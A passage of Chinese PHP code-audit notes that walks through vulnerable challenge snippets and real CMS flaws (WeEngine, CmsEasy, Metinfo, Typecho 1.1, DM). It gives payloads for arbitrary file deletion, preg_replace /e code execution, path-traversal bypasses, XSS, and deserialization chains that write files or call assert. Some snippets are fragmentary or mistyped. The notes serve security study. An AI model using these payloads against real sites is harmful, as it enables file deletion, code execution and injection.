      public function createToken($seed) {
        $token = md5($seed);
        file_put_contents('/tmp/tokens/' . $token, '...data');
      }
      public function clearToken($token) {
        $file = preg_replace("/[^a-z.-_]/", "", $token);
        unlink('/tmp/tokens/' . $file);
      }
    }
    $storage = new TokenStorage();
    $storage->performAction($_GET['action'], $_GET['data']);
  * preg_replace(函数执行一个正则表达式的搜索和替换)
  * payload
    $action =delete$data = ../../config.php
### WeEngine0.8
  * web/source/site/category.ctrl.php:176
**file_delete文件删除函数**  
  * framework/function/file.func.php:294
**查看file_delete函数**
  * 追朔$file变量从何而来
    if (!empty($navs)) {
            foreach ($navs as $row) {
                file_delete($row['icon']);
            }
  * 追朔$navs从何而来
    $navs = pdo_fetchall("SELECT icon, id FROM ".tablename('site_nav')." WHERE id IN (SELECT nid FROM ".tablename('site_category')." WHERE id = {$id} OR parentid = '$id')", array(), 'id');
  * web/source/site/category.ctrl.php:137
  * web/source/site/category.ctrl.php:130
**$nav['icon'] 即为文件删除函数的参**
## parse_str函数缺陷
  * parse_str
    parse_str的作用就是解析字符串并且注册成变量，它在注册变量之前不会验证当前变量是否存在，所以会直接覆盖掉当前作用域中原有的变量。
## preg_replace函数之命令执行
### Candle
  * code 
    header("Content-Type: text/plain");
    function complexStrtolower($regex, $value) {
      return preg_replace(
        '/(' . $regex . ')/ei',
        'strtolower("\\1")',
        $value
      );
    }
    foreach ($_GET as $regex => $value) {
      echo complexStrtolower($regex, $value) . "\n";
    }
  * preg_replace(函数执行一个正则表达式的搜索和替换)
    mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )
**$pattern 存在 /e 模式修正符，允许代码执行**  
**/e 模式修正符，是 preg_replace() 将 $replacement 当做php代码来执行**
**将GET请求传过来的参数通过complexStrtolower函数执行，preg_replace函数存在e修正符**
  * payload
    \S*=${phpinfo()}
#### 参考
[深入研究preg_replace与代码执行](https://xz.aliyun.com/t/2557)
### CmsEasy 5.5
  * 环境搭建
#### 漏洞分析
  * lib/tool/form.php:90
**如果$form[$name]['default']内容被匹配到就会执行eval**
  * cache/template/default/manage/#guestadd.php:175
**全局搜索getform，主要注意catid是作为$name的**
  * lib/table/archive.php:25
**追朔catid,寻找到default**
  * lib/tool/front_class.php:2367
  * lib/tool/front_class.php:493
  * lib/tool/front_class.php:332
**$form[$name]['default']可控**  
  * lib/default/manage_act.php:29
  * 测试
## str_replace函数过滤不当
#### Rabbit
  * code
    class LanguageManager {
      public function loadLanguage() {
        $lang = $this->getBrowserLanguage();
        $sanitizedLang = $this->sanitizeLanguage($lang);
        require_once("/lang/$sanitizedLang");
      }
      private function getBrowserLanguage() {
        $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'en';
        return $lang;
      }
      private function sanitizeLanguage($language) {
        return str_replace('../', '', $language);
      }
    }
    (new LanguageManager())->loadLanguage();
  * str_replace(子字符串替换)
    str_replace(字符串1，字符串2，字符串3)：将字符串3中出现的所有字符串1换成字符串2。
    str_replace(数组1，字符串1，字符串2)：将字符串2中出现的所有数组1中的值，换成字符串1。
    str_replace(数组1，数组2，字符串1)：将字符串1中出现的所有数组1一一对应，替换成数组2的值，多余的替换成空字符串。
  * payload
    ....// 或者 ..././
### Metinfo 6.0.0
  * strstr
    查找字符串的首次出现到结尾的字符串
#### 漏洞分析
  * app/system/include/module/old_thumb.class.php:14
  * include/thumb.php:6
**全局搜索**  
  * app/system/include/class/load.class.php:113
  * payload 
    http://localhost/metInfo/include/thumb.php?dir=.....///http/.....///最终用户授权许可协议.txt
## 程序未恰当exit导致的问题
### Anticipation
  * code 
    extract($_POST);
    function goAway() {
      error_log("Hacking attempt.");
      header('Location: /error/');
    }
    if (!isset($pi) || !is_numeric($pi)) {
      goAway();
    }
    if (!assert("(int)$pi == 3")) {
      echo "This is not pi.";
    } else {
      echo "This might be pi.";
    }
  * extract 
    从数组中将变量导入到当前的符号表
  * payload
    pl=phpinfo()
  * 测试
### FengCms 1.32
  * install/index.php
**如果安装完成会生成INSTALL文件，访问文件如果存在此文件则会弹窗提示退出，但没有及时exit，导致程序逻辑还是往下走，还是会安装**
### Simple-Log1.6网站重装漏洞
  * install/index.php
**访问文件如果存在此文件则会弹窗提示退出，但没有及时exit，只是跳转到首页，导致程序逻辑还是往下走，还是会安装**
## unserialize反序列化漏洞
### Pumpkin Pie
  * code
    class Template {
      public $cacheFile = '/tmp/cachefile';
      public $template = 'Welcome back %s';
      public function __construct($data = null) {
        $data = $this->loadData($data);
        $this->render($data);
      }
      public function loadData($data) {
        if (substr($data, 0, 2) !== 'O:'
          && !preg_match('/O:\d:\/', $data)) {
          return unserialize($data);
        }
        return [];
      }
      public function createCache($file = null, $tpl = null) {
        $file = $file ?? $this->cacheFile;
        $tpl = $tpl ?? $this->template;
        file_put_contents($file, $tpl);
      }
      public function render($data) {
        echo sprintf(
          $this->template,
          htmlspecialchars($data['name'])
        );
      }
      public function __destruct() {
        $this->createCache();
      }
    }
    new Template($_COOKIE['data']);
  * 题解
**在loadData函数中使用到了unserialize反序列化方法，对传进来的$data进行了反序列化，最后对Template进行了实例化，将COOKIE中的data进行了反序列化。**
    if (substr($data, 0, 2) !== 'O:'
          && !preg_match('/O:\d:\/', $data))
**代码对data进行了判断，不可以为对象，0:X，X不可以为数字，绕过方法可以使用array数组绕过第一个，在X前面加+绕过第二个限制，搭达到到达反序列化方法的步骤。在__destruct销毁时会调用createCache方法写入文件，达成目的。**
  * payload
    ';
    }
    $temp= new Template();
    $test = Array($temp);
    print(serialize($test));
    ?>
  * 测试
    a:1:{i:0;O:+8:"Template":2:{s:9:"cacheFile";s:10:"./test.php";s:8:"template";s:26:"";}}
### Typecho-1.1
  * 环境搭建
#### 漏洞分析
  * install.php:230
**将cookie中的__typecho_configbase64解码之后进行反序列化操作**
  * 条件
**如果finish不存在，或者存在config.inc.php文件$_SESSION['typecho']为空，则退出程序**
    if (!isset($_GET['finish']) && file_exists(__TYPECHO_ROOT_DIR__ . '/config.inc.php') && empty($_SESSION['typecho'])) {
        exit;}
    finish=1
**将反序列化后的结果传递给$config**
  * install.php:232
  * var/Typecho/Db.php:114
**变量adapterName = 'Typecho_Db _Adapter_ ' .
变量adapterName，如果adapterName是对象，会触发__toString()方法**
  * var/Typecho/Feed.php:223
  * var/Typecho/Feed.php:290
**如果$item['author']- >screenName为私有属性或者不存在会触发__get方法**  
    public function __get($key)
        {
            return $this->get($key);
        }
  * var/Typecho/Request.php:295
**call_user_fun回调函数，$this- >_param['scrrenName'] 的值设置为想要执行的函数，构造
$this->_filter 为对应函数的参数值self::RSS2 ==
$this->_type,type需要构造，item['author']为触发点，需要构造this_items**
  * 构造payload
    _params['screenName'] = 'phpinfo()';
            $this->_fifter[0] = 'assert';
        }
    }
    class Typecho_Feed{
        private $_type;
        private $_item = array();
        public function s__construct(){
            $this->_type = 'RSS 2.0';
            $item['author'] = new Typecho_Request();
            $item['category']=Array(new Typecho_Request());
            $this->_item[0]=$item;
        }
    }
    $x = new Typecho_Feed();
    $a = array(
        'adapter' => $x,
        'prefix' => 'Typecho_'
    );
    echo base64_encode(serialize($a));
    ?>
  * 测试
## 误用htmlentities函数引发的漏洞
### String Lights
  * code 
    $sanitized = [];
    foreach ($_GET as $key => $value) {
      $sanitized[$key] = intval($value);
    }
    $queryParts = array_map(function ($key, $value) {
      return $key . '=' . $value;
    }, array_keys($sanitized), array_values($sanitized));
    $query = implode('&', $queryParts);
    echo "link";
  * htmlentities 
    将字符转换为 HTML 转义字符
_ENT_COMPAT（默认值）：只转换双引号。  
ENT_QUOTES：两种引号都转换。  
ENT_NOQUOTES：两种引号都不转换。_
  * 环境搭建
  * payload
    a%27onclick%3Dalert%281%29%2f%2f=1
### DM企业建站系统 v201710
#### 漏洞分析
  * admindm-yourname/mod_common/login.php:63
  * 直接拼接数据
    $ss_P="select * from ".TABLE_USER."  where  email='$user' and ps='$pscrypt'  order by id desc limit 1";
  * component/dm-config/global.common.php:421
**ENT_NOQUOTES两种引号都不转换，造成注入**  
## 特定场合下addslashes函数的绕过
### Turkey Baster
  * code 
    class LoginManager {
      private $em;
      private $user;
      private $password;
      public function __construct($user, $password) {
        $this->em = DoctrineManager::getEntityManager();
        $this->user = $user;
        $this->password = $password;
      }
      public function isValid() {
        $user = $this->sanitizeInput($this->user);
        $pass = $this->sanitizeInput($this->password);
        $queryBuilder = $this->em->createQueryBuilder()
          ->select("COUNT(p)")
          ->from("User", "u")
          ->where("user = '$user' AND password = '$pass'");
        $query = $queryBuilder->getQuery();
        return boolval($query->getSingleScalarResult());